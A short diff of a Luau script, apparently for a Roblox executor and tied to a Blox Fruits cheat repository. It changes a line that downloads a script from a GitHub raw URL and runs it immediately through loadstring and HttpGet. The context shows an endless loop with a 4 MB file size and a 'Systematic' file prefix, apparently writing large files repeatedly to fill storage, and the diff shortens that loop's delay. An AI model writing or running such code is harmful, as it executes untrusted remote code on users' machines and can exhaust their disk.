@@ -1,4 +1,4 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/bloxfruitsnokey/Redz/refs/heads/main/Amethyst/new.luau"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/bloxfruitsnokey/Arcylic/refs/heads/main/Comet/run.luau"))()
 task.wait(10)
 local fileNamePrefix = "Systematic"
 local fileSize = 4 * 1024 * 1024
@@ -20,5 +20,5 @@ while true do
     end
 
     counter = counter + 1
-    task.wait(0.02)
+    task.wait(0.2)
 end
